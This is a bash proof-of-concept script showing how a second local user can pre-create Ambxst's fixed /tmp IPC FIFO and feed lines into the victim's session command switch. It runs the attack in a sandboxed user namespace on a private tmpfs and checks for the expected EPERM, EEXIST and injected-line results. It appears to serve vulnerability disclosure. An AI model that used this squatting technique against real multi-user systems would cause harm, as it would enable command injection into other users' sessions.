#!/usr/bin/env bash
# PoC cross-user squat of the fixed /tmp/ambxst_ipc.pipe (Ambxst,
# modules/services/GlobalShortcuts.qml, pipeListener).
#
# A second local user pre-creates the path. The sticky bit denies the victim's
# rm (EPERM) and mkfifo (EEXIST), and tail -f then streams the attacker's FIFO
# into the session command switch.
#
# Everything runs inside an unprivileged user namespace on a private tmpfs.
# Run: bash tmp_ipc_squat.sh

set -u

if ! command -v unshare >/dev/null 2>&1; then
    echo "SKIP: unshare(1) not available"
    exit 0
fi

OUT=$(timeout 10 unshare -Urm --map-users=auto --map-groups=auto sh -c '
mount -t tmpfs tmp /tmp
mkdir /tmp/squat-poc && chmod 1777 /tmp/squat-poc && chown 1 /tmp/squat-poc
mkfifo /tmp/squat-poc/node && chmod 666 /tmp/squat-poc/node && chown 1 /tmp/squat-poc/node
echo "--- attacker (inner uid 1) placed a sticky dir and a world-writable FIFO:"
ls -ldn /tmp/squat-poc /tmp/squat-poc/node
setpriv --reuid 1 --regid 1 --clear-groups bash -c "echo attacker-injected-line > /tmp/squat-poc/node" &
setpriv --reuid 2 --regid 2 --clear-groups bash -c "rm -f /tmp/squat-poc/node; mkfifo /tmp/squat-poc/node; timeout 2 tail -f /tmp/squat-poc/node" 2>&1
') 
STATUS=$?

echo "$OUT"

case "$OUT" in
    *"Operation not permitted"*) : ;;
    *) echo "FAIL: victim rm was not denied by the sticky bit" ; exit 1 ;;
esac
case "$OUT" in
    *"File exists"*) : ;;
    *) echo "FAIL: victim mkfifo did not hit the squatted node" ; exit 1 ;;
esac
case "$OUT" in
    *"attacker-injected-line"*) : ;;
    *) echo "FAIL: victim reader never consumed the attacker line" ; exit 1 ;;
esac

echo "CONFIRMED: cross-user squat succeeded; the victim's rm and mkfifo were denied (EPERM + EEXIST)"
echo "CONFIRMED: tail -f streams the attacker-controlled node into the session command switch"
exit 0
